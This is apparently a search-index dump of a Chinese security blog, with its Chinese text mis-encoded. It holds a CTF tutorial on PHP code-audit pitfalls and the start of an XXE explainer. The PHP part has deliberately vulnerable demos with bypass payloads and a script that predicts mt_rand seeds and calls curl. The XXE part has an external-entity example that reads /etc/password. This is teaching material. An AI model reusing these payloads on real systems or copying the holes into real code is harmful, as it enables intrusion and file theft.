var_dump(array_search('1bc', $array)); var_dump(array_search(3, $array)); var_dump(array_search('3', $array)); è¿”å›ç»“æœä¸ºï¼š0ã€1ã€3ã€3 \u003c?php if (!is_array($_GET['test'])) { exit(); } $test = $_GET['test']; for ($i = 0; $i \u003c count($test); $i++) { if ($test[$i] === \"admin\") { echo \"error\"; exit(); } $test[$i] = intval($test[$i]); } if (array_search(\"admin\", $test) === 0) { echo \"flag\"; } else { echo \"false\"; } Payloadï¼šurl?test[0]=0 1.2.7 strpos å‡½æ•° \u003c?php var_dump(strpos('abcd', 'a')); // int(0) var_dump(strpos('abcd', 'a') == false); // bool(true) ","date":"2019-03-17","objectID":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:1:2","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","CTF"],"title":"CTF ä¸­çš„ PHP ä»£ç å®¡è®¡","uri":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","ä»£ç å®¡è®¡"],"content":"2 å˜é‡è¦†ç›–é—®é¢˜ ","date":"2019-03-17","objectID":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:2:0","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","CTF"],"title":"CTF ä¸­çš„ PHP ä»£ç å®¡è®¡","uri":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","ä»£ç å®¡è®¡"],"content":"2.1 extract å‡½æ•° demoï¼š \u003c?php highlight_file(__FILE__); include \"flag.php\"; extract($_GET); if(isset($gift)) { $content = trim(file_get_contents($flag)); if($gift == $content) { echo $trueflag; } else { echo \"Oh...\"; } } ?\u003e è®© file_get_content() è¿”å›å€¼ä¸ºç©ºï¼Œå³å¯ç»•è¿‡ã€‚ Payloadï¼š?gift=\u0026flag= ","date":"2019-03-17","objectID":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:2:1","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","CTF"],"title":"CTF ä¸­çš„ PHP ä»£ç å®¡è®¡","uri":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","ä»£ç å®¡è®¡"],"content":"2.2 éå†åˆå§‹åŒ–å˜é‡ ç”±äº php ä¸­å¯ä»¥ä½¿ç”¨ $ $ å£°æ˜å˜é‡ï¼Œå› æ­¤å­˜åœ¨éå†æ•°ç»„æ—¶å¯èƒ½ä¼šè¦†ç›–åŸæ¥çš„å€¼ \u003c?php highlight_file(__FILE__); $a = \"helloworld\"; echo $a; echo \"$a\"; echo \"\u003cbr /\u003e\" foreach($_GET as $key =\u003e $value) { $$key = $value; } echo \"$a\"; ?\u003e $key ä¸ $value éƒ½å¯æ§ï¼Œå› æ­¤ä¿®æ”¹ $a å˜é‡çš„ç‚¹åœ¨ä»£ç ç¬¬ 8 è¡Œå¤„ï¼Œè®© $key=aï¼Œ$$key=$aï¼Œ$value ä¸ºæƒ³è¦ä¿®æ”¹çš„å€¼ Payloadï¼šurl?a=afterChange Demoï¼š \u003c?php highlight_file(__FILE__); include \"flag.php\"; $_403 = \"Access Denied\"; $_200 = \"Welcome Admin\"; if($_SERVER[\"REQUEST_METHOD\"] != \"POST\") { die(\"BugsBunnyCTF is here:p...\"); } if (!isset($_POST[\"flag\"])) { die($_403); } foreach ($_GET as $key =\u003e $value) { $$key = $$value; } foreach ($_POST as $key =\u003e $value) { $$key = $value; } if($_POST[\"flag\"] !== $flag) { die($_403); } echo \"This is your flag : \". $flag . \"\\n\"; die($_200); ?\u003e Payloadï¼šurl?_200=flag + postï¼šflag=123 ","date":"2019-03-17","objectID":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:2:2","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","CTF"],"title":"CTF ä¸­çš„ PHP ä»£ç å®¡è®¡","uri":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","ä»£ç å®¡è®¡"],"content":"2.3 parse_str å‡½æ•° Demoï¼š \u003c?php include \"flag.php\"; if(empty($_GET['id'])) { show_source(__FILE__); die(); } else { include(\"flag.php\"); $a = \"www.OPENCTF.com\"; $id = $_GET['id']; @parse_str($id); if($a[0] != \"QNKCDZO\" \u0026\u0026 md5($a[0]) == md5(\"QNKCDZO\")) { echo $flag; } else { exit(\"å…¶å®å¾ˆç®€å•å¹¶ä¸éš¾!\"); } } ?\u003e Payloadï¼šurl?id=a[0]=s878926199a æŠ€å·§ ç”±äº PHP çš„å˜é‡åä¸èƒ½å¸¦ã€Œç‚¹ã€å’Œã€Œç©ºæ ¼ã€ï¼Œå› æ­¤åœ¨ parase_str å‡½æ•°ä¸­ï¼Œä»–ä»¬ä¼šè¢«è½¬åŒ–æˆä¸‹åˆ’çº¿ã€‚ \u003c?php $a = $_GET[\"a_a\"]; echo $a; å½“ä¼ å…¥çš„å‚æ•°åä¸ºï¼šurl?a.a=123 æ—¶ï¼Œä¼šè¢«è½¬åŒ–æˆ a_aï¼Œå› æ­¤å¯ä»¥æ­£å¸¸è¾“å‡ºå†…å®¹ ","date":"2019-03-17","objectID":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:2:3","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","CTF"],"title":"CTF ä¸­çš„ PHP ä»£ç å®¡è®¡","uri":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","ä»£ç å®¡è®¡"],"content":"3 ç©ºç™½ç¬¦ç›¸å…³ \u003c?php highlight_file(__FILE__); include \"flag.php\"; $info = \"\"; $req = []; ini_set(\"display_error\", false); error_report(0); if(!isset($_GET[\"number\"])) { die(\"have a fun!\"); } foreach([$_GET, $_POST] as $global_var) { foreach($global_var as key =\u003e $value) { $value = trim($value); is_string($value) \u0026\u0026 $req[$key] = addslashes($value); } } function is_palindrome_number($number) { $number = strval($number); $i = 0; $j = strlen($number) - 1; while($i \u003c $j) { if($number[$i] !== $number[$j]) { return false; } $i++; $j--; } return true; } if(is_numeric($_REQUEST['number'])) { $info = \"Sorry, you can not input a number!\"; } else if($req['number'] != strval(intval($req['number']))) { $info = \"number must be equal to it\\'s integer!!\"; } else { $value1 = intval($req[\"number\"]); $value2 = intval(strrev($req[\"number\"])); if($value1 != $value2) { $info = \"no, this is not a palindrome number\"; } else { if(is_palindrome_number($req[\"number\"])) { $info = \"nice! {$value1} is a palindrome number!\" } else { $info = $flag; } } } echo $info; ?\u003e ","date":"2019-03-17","objectID":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:3:0","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","CTF"],"title":"CTF ä¸­çš„ PHP ä»£ç å®¡è®¡","uri":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","ä»£ç å®¡è®¡"],"content":"3.1 intval å‡½æ•° æˆåŠŸè¿”å› var çš„ interger å€¼ï¼Œå¤±è´¥æ—¶è¿”å› 0ã€‚ç©ºçš„ array è¿”å› 0ï¼Œéç©ºçš„ array è¿”å› 1 æœ€å¤§çš„å€¼å–å†³äºæ“ä½œç³»ç»Ÿ 32 ä½æ“ä½œç³»ç»Ÿæœ€å¤§æœ‰ç¬¦å·æ•´å‹èŒƒå›´æ˜¯ -2147483648 åˆ° 2147483647 64 ä½ç³»ç»Ÿä¸Šï¼Œæœ€å¤§æœ‰ç¬¦å·çš„æ•´æ•°çš„å€¼ä¸º 9223372036854775807 \u003c?php echo intval(42); // 42 echo intval(4.2); // 4 echo intval('42'); // 42 echo intval('+42'); // 42 echo intval('-42'); // -42 echo intval(042); // 34 echo intval('042'); // 42 echo intval(1e10); // 1000000000 echo intval('1e10'); // 1 echo intval(0x1A); // 26 echo intval(42000000); // 42000000 echo intval(420000000000000000000); // 0 echo intval('420000000000000000000'); // 2147483647 echo intval(42, 8); // 42 echo intval('42', 8); // 34 echo intval(array()); // 0 echo intval(array('foo', 'bar')); // 1 ?\u003e ","date":"2019-03-17","objectID":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:3:1","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","CTF"],"title":"CTF ä¸­çš„ PHP ä»£ç å®¡è®¡","uri":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","ä»£ç å®¡è®¡"],"content":"3.2 æµ®ç‚¹æ•°ç²¾åº¦ ","date":"2019-03-17","objectID":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:3:2","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","CTF"],"title":"CTF ä¸­çš„ PHP ä»£ç å®¡è®¡","uri":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","ä»£ç å®¡è®¡"],"content":"3.3 is_numeric å‡½æ•° å½“ä¼ å…¥çš„å­—ç¬¦ä¸²ä¸­å«æœ‰ç©ºæ ¼ ã€\\t \\r \\n \\v \\f ç­‰ç‰¹æ®Šç¬¦å·ï¼Œè¿”å›ç»“æœä»ä¸º true ","date":"2019-03-17","objectID":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:3:3","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","CTF"],"title":"CTF ä¸­çš„ PHP ä»£ç å®¡è®¡","uri":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","ä»£ç å®¡è®¡"],"content":"3.3 trim å‡½æ•° å‡½æ•°å¯¹æ¯”ï¼š æºç  trim å»é™¤\\t\\n\\r\\0\\x0B is_numericã€intval è·³è¿‡\\t\\n\\r\\f\\v payload : ?number=%00%0c121 ","date":"2019-03-17","objectID":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:3:4","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","CTF"],"title":"CTF ä¸­çš„ PHP ä»£ç å®¡è®¡","uri":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","ä»£ç å®¡è®¡"],"content":"4 ä¼ªéšæœºæ•°ç›¸å…³ ","date":"2019-03-17","objectID":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:4:0","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","CTF"],"title":"CTF ä¸­çš„ PHP ä»£ç å®¡è®¡","uri":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","ä»£ç å®¡è®¡"],"content":"4.1 mt_rand å‡½æ•° å¦‚æœæˆ‘ä»¬è‡ªå·±æŒ‡å®šèŒƒå›´ï¼Œå¦‚æœè¿‡å°æ˜¯å¾ˆå®¹æ˜“è¢«çˆ†ç ´å‡ºæ¥çš„ï¼Œå› æ­¤å¤§å¤šæ•°å®é™…åº”ç”¨ä¸­éƒ½æ˜¯ä¸æŒ‡å®šèŒƒå›´ï¼Œmt_rand() å‡½æ•°é»˜è®¤èŒƒå›´æ˜¯ 0 åˆ° mt_getrandmax() ä¹‹é—´çš„ä¼ªéšæœºæ•° ç›¸åŒçš„ç§å­ç”Ÿæˆçš„éšæœºæ•°æ˜¯ç›¸åŒçš„ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡é€†æ¨ mt_rand çš„ç§å­æ¥è·å¾—åŒé¡µé¢çš„å¦ä¸€ä¸ª rand çš„å€¼ å·¥å…·ï¼šphp_mt_seed ","date":"2019-03-17","objectID":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:4:1","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","CTF"],"title":"CTF ä¸­çš„ PHP ä»£ç å®¡è®¡","uri":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","ä»£ç å®¡è®¡"],"content":"4.2 DEMO \u003c?php highlight_file(__FILE__); include \"flag.php\"; error_reporting(0); echo \"please input a rand num!\"; function create_password($pw_length = 4) { $randpwd = \"\"; for ($i = 0; $i \u003c $pw_length; $i++) { $randpwd .= mt_rand(); } return $randpwd; } session_start(); // var_dump($_SESSION); $time = time(); mt_srand($time); $pwd = create_password(); // var_dump(($_SESSION['userLogin'] == $_GET['login'])); // echo $pwd . '||'; // echo $_GET['pwd']; // var_dump($pwd == $_GET['pwd']); if ($pwd == $_GET['pwd']) { echo \"first\"; //NULL == NULL å³å¯ç»•è¿‡ï¼Œå³ä¿æŒç¬¬ä¸€æ¬¡ç™»å½• if ($_SESSION['userLogin'] == $_GET['login']) { echo \"Nice, you get the flag it is\" . $flag; } } else { echo \"Wrong!\"; } $_SESSION['userLogin'] = create_password(32) . rand(); ?\u003e Payloadï¼š \u003c?php function create_password($pw_length=4) { $randpwd = \"\"; for ($i=0; $i \u003c $pw_length; $i++) { $randpwd .= mt_rand(); } return $randpwd; } mt_srand(time()); $pwd = create_password(); $url = \"http://xxx/mt_rand.php?pwd=\". $pwd; system('curl'. $url); echo $pwd; ?\u003e ","date":"2019-03-17","objectID":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:4:2","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","CTF"],"title":"CTF ä¸­çš„ PHP ä»£ç å®¡è®¡","uri":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","ä»£ç å®¡è®¡"],"content":"5 å…¶å®ƒå‡½æ•° ","date":"2019-03-17","objectID":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:5:0","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","CTF"],"title":"CTF ä¸­çš„ PHP ä»£ç å®¡è®¡","uri":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","ä»£ç å®¡è®¡"],"content":"5.1 è¿ç®—ç¬¦ä¼˜å…ˆçº§ \u003c?php highlight_file(__FILE); include \"flag.php\"; $a = 'test'; $b = 'test2'; $a = $_GET['a']; $b = $_GET['b']; // è¿ç®—ç¬¦ä¼˜å…ˆçº§ï¼Œ= å· \u003e and å·ï¼Œå³($c = is_numeric($a)) and is_numeric($b) $c = is_numeric($a) and is_numeric($b); if($c) { if(is_numeric($a)) { if(is_numeric($b)) { echo \"is_numeric(b)\"; } else { echo $flag; } } else { echo \"is_numeric(a) error\"; } } else { print \"is_numeric(a) and is_numeric(b) error !\"; } ?\u003e payloadï¼šurl?a=123 ","date":"2019-03-17","objectID":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:5:1","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","CTF"],"title":"CTF ä¸­çš„ PHP ä»£ç å®¡è®¡","uri":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","ä»£ç å®¡è®¡"],"content":"5.2 parase_url å¦‚æœæŒ‡å®šäº† component å‚æ•°ï¼Œ parse_url() è¿”å›ä¸€ä¸ª string ï¼ˆæˆ–åœ¨æŒ‡å®šä¸º PHP_URL_PORT æ—¶è¿”å›ä¸€ä¸ª integerï¼‰è€Œä¸æ˜¯ arrayã€‚å¦‚æœ URL ä¸­æŒ‡å®šçš„ç»„æˆéƒ¨åˆ†ä¸å­˜åœ¨ï¼Œå°†ä¼šè¿”å› NULLã€‚ Demoï¼š \u003c?php include \"flag.php\"; $number1 = rand(1, 100000000000000); $number2 = rand(1, 100000000000); $number3 = rand(1, 100000000); $url = urldecode($_SERVER['REQUEST_URI']); // åˆ©ç”¨ http:/// ä½¿å¾— parse_url è¿”å› falseï¼Œç»•è¿‡æ­£åˆ™è¡¨è¾¾å¼ã€‚ $url = parse_url($url, PHP_URL_QUERY); if (preg_match(\"/_/i\", $url)) { die(\"..1\"); } if (preg_match(\"/0/i\", $url)) { die(\"..2\"); } if (preg_match(\"/\\w+/i\", $url)) { die(\"..3\"); } if(isset($_GET['_']) \u0026\u0026 !empty($_GET['_'])) { $control = $_GET['_']; // in_array()å‡½æ•°æ¼æ´ï¼švar_dump(0 == \"a\") =\u003e true if (!in_array($control, , array(0, $number1))) { die(\"fail1\"); } if (!in_array($control, , array(0, $number2))) { die(\"fail2\"); } if (!in_array($control, , array(0, $number3))) { die(\"fail3\"); } echo $flag; } show_source(__FILE__); ?\u003e Payloadï¼šhttp:///url?_=a æˆ– http:///url?.=a ","date":"2019-03-17","objectID":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:5:2","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","CTF"],"title":"CTF ä¸­çš„ PHP ä»£ç å®¡è®¡","uri":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","ä»£ç å®¡è®¡"],"content":"6 escapeshellarg å’Œ escapeshellcmd ","date":"2019-03-17","objectID":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:6:0","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","CTF"],"title":"CTF ä¸­çš„ PHP ä»£ç å®¡è®¡","uri":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","ä»£ç å®¡è®¡"],"content":"6.1 ç›¸å…³å‡½æ•° ","date":"2019-03-17","objectID":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:6:1","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","CTF"],"title":"CTF ä¸­çš„ PHP ä»£ç å®¡è®¡","uri":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","ä»£ç å®¡è®¡"],"content":"6.2 Demo \u003c?php highlight_file(__FILE__); function waf($a){ foreach($a as $key =\u003e $value){ if(preg_match('/flag/i',$key)){ exit('are you a hacker'); } } } foreach(array('_POST', '_GET', '_COOKIE') as $__R) { if($$__R) { foreach($$__R as $__k =\u003e $__v) { if(isset($$__k) \u0026\u0026 $$__k == $__v) unset($$__k); } } } if($_POST) { waf($_POST);} if($_GET) { waf($_GET); } if($_COOKIE) { waf($_COOKIE);} if($_POST) extract($_POST, EXTR_SKIP); if($_GET) extract($_GET, EXTR_SKIP); // var_dump($_GET); // echo '\u003cbr\u003e\u003c/br\u003e'; if(isset($_GET['flag'])){ if($_GET['flag'] === $_GET['hongri']){ exit('error'); } if(md5($_GET['flag'] ) == md5($_GET['hongri'])){ $url = $_GET['url']; $urlInfo = parse_url($url); var_dump($urlInfo); // echo '\u003cbr\u003e\u003c/br\u003e'; if(!(\"http\" === strtolower($urlInfo[\"scheme\"]) || \"https\"===strtolower($urlInfo[\"scheme\"]))){ die( \"scheme error!\"); } $url = escapeshellarg($url); $url = escapeshellcmd($url); echo $url; system(\"curl \".$url); } } ?\u003e ","date":"2019-03-17","objectID":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:6:2","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","CTF"],"title":"CTF ä¸­çš„ PHP ä»£ç å®¡è®¡","uri":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"XXE æ¼æ´ç›¸å…³æ¼æ´ç›¸å…³","date":"2019-03-15","objectID":"/2019/03/xxe%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","XXE"],"title":"XXE æ¼æ´ç›¸å…³","uri":"/2019/03/xxe%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"XXE æ¼æ´ç›¸å…³ ","date":"2019-03-15","objectID":"/2019/03/xxe%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:0:0","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","XXE"],"title":"XXE æ¼æ´ç›¸å…³","uri":"/2019/03/xxe%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"1 å®šä¹‰ä¸åŸç† ","date":"2019-03-15","objectID":"/2019/03/xxe%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:1:0","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","XXE"],"title":"XXE æ¼æ´ç›¸å…³","uri":"/2019/03/xxe%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"1.1 XXE å®šä¹‰ XXE æ¼æ´å…¨ç§° XML External Entity Injectionï¼ŒXML å¤–éƒ¨å®ä½“æ³¨å…¥æ¼æ´ï¼ŒXXE æ¼æ´å‘ç”Ÿåœ¨åº”ç”¨ç¨‹åºè§£æ XML è¾“å…¥æ—¶ï¼Œæ²¡æœ‰ç¦æ­¢å¤–éƒ¨å®ä½“çš„åŠ è½½ï¼Œå¯¼è‡´å¯åŠ è½½æ¶æ„å¤–éƒ¨æ–‡ä»¶ï¼Œé€ æˆæ–‡ä»¶è¯»å–ã€å†…ç½‘ç«¯å£æ‰«æã€æ”»å‡»å†…ç½‘ç½‘ç«™å‘èµ· dos æ”»å‡»ç­‰å±å®³ã€‚ ","date":"2019-03-15","objectID":"/2019/03/xxe%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:1:1","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","XXE"],"title":"XXE æ¼æ´ç›¸å…³","uri":"/2019/03/xxe%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"1.2 XML åŸºç¡€ 1.2.1 XML å®šä¹‰ æ–‡æ¡£æ ‡è®°è¯­è¨€ï¼ŒXML æ–‡æ¡£ç»“æ„åŒ…æ‹¬ XML å£°æ˜ã€DTD æ–‡æ¡£ç±»å‹å®šä¹‰ï¼ˆå¯é€‰ï¼‰ã€æ–‡æ¡£å…ƒç´  \u003c!-- å£°æ˜ä¿¡æ¯ --\u003e \u003c?xml version=\"1.0\" encoding=\"UTF-8\" ?\u003e \u003cscores\u003e \u003cstudent id=\"s1\"\u003e \u003cname\u003ehacker\u003c/name\u003e \u003ccourse\u003eC++\u003c/course\u003e \u003cscore\u003e95\u003c/score\u003e \u003c/student\u003e \u003c/scores\u003e 1.2.2 DTD å®šä¹‰ DTD - Document Type Definition æ–‡æ¡£ç±»å‹å®šä¹‰ï¼Œåˆ©ç”¨ DTD å®šä¹‰ XML æ–‡æ¡£ä¸­æœ‰å“ªäº›æ¨¡å—ä»¥åŠæ¨¡å—ä¸­æœ‰å“ªäº›å†…å®¹ï¼ˆç±»æ¯”å¼ºç±»å‹è¯­è¨€ï¼‰ã€‚ åœ¨ XML æ–‡ä»¶ä¸­å®šä¹‰å†…éƒ¨ DTDï¼š \u003c!-- å£°æ˜ä¿¡æ¯ --\u003e \u003c?xml version=\"1.0\" encoding=\"UTF-8\" ?\u003e \u003c!-- å®šä¹‰å†…éƒ¨ DTD --\u003e \u003c!DOCTYPE scores [ \u003c!ELEMENT scores (student+) \u003e \u003c!ELEMENT student (name, course, score) \u003e \u003c!ATTLIST student id CDATA #REQUIRED \u003e \u003c!ELEMENT course (#PCDATA)\u003e \u003c!ELEMENT name (#PCDATA)\u003e \u003c!ELEMENT score (#PCDATA)\u003e ]\u003e \u003cscores\u003e \u003cstudent id=\"s1\"\u003e \u003cname\u003ehacker\u003c/name\u003e \u003ccourse\u003eC++\u003c/course\u003e \u003cscore\u003e90\u003c/score\u003e \u003c/student\u003e \u003c/scores\u003e PCDATA çš„æ„æ€æ˜¯è¢«è§£æçš„å­—ç¬¦æ•°æ® å¼•ç”¨å¤–éƒ¨å®ä½“ï¼š \u003c!-- å£°æ˜ä¿¡æ¯ --\u003e \u003c?xml version=\"1.0\" encoding=\"UTF-8\" ?\u003e \u003c!-- å¼•ç”¨å¤–éƒ¨ DTD --\u003e \u003c!DOCTYPE scores SYSTEM \"scores.dtd\"\u003e \u003cscores\u003e \u003cstudent id=\"s1\"\u003e \u003cname\u003ehacker\u003c/name\u003e \u003ccourse\u003eC++\u003c/course\u003e \u003cscore\u003e90\u003c/score\u003e \u003c/student\u003e \u003c/scores\u003e scores.dtd æ–‡ä»¶å†…å®¹ï¼š \u003c!-- å£°æ˜ä¿¡æ¯ --\u003e \u003c?xml version=\"1.0\" encoding=\"UTF-8\" ?\u003e \u003c!ELEMENT scores (student+) \u003e \u003c!ELEMENT student (name, course, score) \u003e \u003c!ATTLIST student id CDATA #REQUIRED \u003e \u003c!ELEMENT course (#PCDATA)\u003e \u003c!ELEMENT name (#PCDATA)\u003e \u003c!ELEMENT score (#PCDATA)\u003e ","date":"2019-03-15","objectID":"/2019/03/xxe%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:1:2","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","XXE"],"title":"XXE æ¼æ´ç›¸å…³","uri":"/2019/03/xxe%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"2 XML å®ä½“æ³¨å…¥ åœ¨ DTD ä¸­å¯ä»¥å®šä¹‰å®ä½“ï¼ˆç±»æ¯”ç¼–ç¨‹è¯­è¨€ä¸­çš„å¸¸é‡ï¼‰ï¼Œå®šä¹‰çš„å®ä½“å¯ä»¥åœ¨ xml ä¸­å¼•ç”¨ï¼Œç»è¿‡ XML è§£æå™¨è§£æåï¼Œå®ä½“å°±ä¼šè¢«æ›¿æ¢æˆå®šä¹‰çš„æ–‡æœ¬å†…å®¹ã€‚ å¼•ç”¨å®ä½“çš„æ ¼å¼ä¸ºï¼š\u0026å®ä½“å; å½“å¼•ç”¨äº†ä¸€ä¸ªå¤–éƒ¨å®ä½“åï¼Œå°±å¯èƒ½å­˜åœ¨ä¸€å®šçš„é—®é¢˜ï¼Œä¸‹é¢çš„ä»£ç æ˜¯ä¸€ä¸ªå¼•ç”¨å¤–éƒ¨å®ä½“çš„ä¾‹å­ï¼š \u003c?xml version=\"1.0\"?\u003e \u003c!DOCTYPE demo[ \u003c!ENTITY content SYSTEM \"file:///etc/password\"\u003e ]\u003e \u003cdemo\u003e\u0026content;\u003c/demo\u003e å› æ­¤ï¼ŒXML 